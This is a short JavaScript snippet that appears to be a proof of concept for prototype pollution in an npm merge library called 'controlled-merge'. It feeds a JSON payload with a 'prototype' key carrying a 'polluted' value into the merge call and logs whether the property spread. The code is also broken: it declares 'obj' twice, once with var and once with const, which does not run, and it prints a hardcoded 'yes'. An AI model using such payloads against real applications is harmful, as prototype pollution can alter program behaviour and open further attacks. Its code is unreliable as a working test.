var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const merge = require('controlled-merge');
const obj = merge(obj, JSON.parse('{ "testProperty": "hi", "prototype" : { "polluted" : "yes" } }'), true);
console.log('{ ' + obj.prototype.polluted + ', ' + 'yes' + ' }');